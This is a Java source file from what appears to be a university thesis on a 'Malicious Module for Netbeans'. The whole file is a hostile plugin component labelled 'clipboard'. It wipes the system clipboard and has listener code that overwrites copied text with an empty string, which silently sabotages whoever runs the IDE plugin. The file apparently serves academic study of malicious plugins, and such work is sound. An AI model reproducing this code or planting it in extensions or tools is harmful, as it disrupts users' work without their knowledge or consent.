/*
 * Gdańsk University of Technology - Engineering Thesis
 * Malicious Module for Netbeans
 *
 * Cilińdź Michał, Gabryelska Nela, Micał Marek
 */
package pl.gda.pg.eti.kio.malicious.entity;

import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.FlavorEvent;
import java.awt.datatransfer.FlavorListener;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import pl.gda.pg.eti.kio.malicious.annotation.CreatableMalicious;
import pl.gda.pg.eti.kio.malicious.event.MaliciousEvent;

/**
 *
 * @author Marek Micał
 */
@CreatableMalicious(name = "clipboard")
public class Clipboard extends BaseMalice implements FlavorListener {

    boolean clipboardWork = true;
    
    java.awt.datatransfer.Clipboard clip = null;

    @Override
    public void flavorsChanged(FlavorEvent e) {
        try {
            Thread.sleep(100);
        } catch (Exception ex) {
        }
        setClipboard();
    }

    public void setClipboard() {

        Transferable trans = clip.getContents(null);

        if (trans.isDataFlavorSupported(DataFlavor.stringFlavor)) {
            try {
                String s = (String) trans.getTransferData(DataFlavor.stringFlavor);
                StringSelection ss = new StringSelection(s);
                StringSelection newString = new StringSelection("");

                clip.setContents(newString, ss);
            } catch (UnsupportedFlavorException | IOException e2) {
            }
        }
    }

    @Override
    protected void execute(MaliciousEvent event) {

        clip = Toolkit.getDefaultToolkit().getSystemClipboard();
        clip.setContents(new StringSelection(""), null);
        if(!clipboardWork){
            clip.addFlavorListener(this);
        }
    }
}
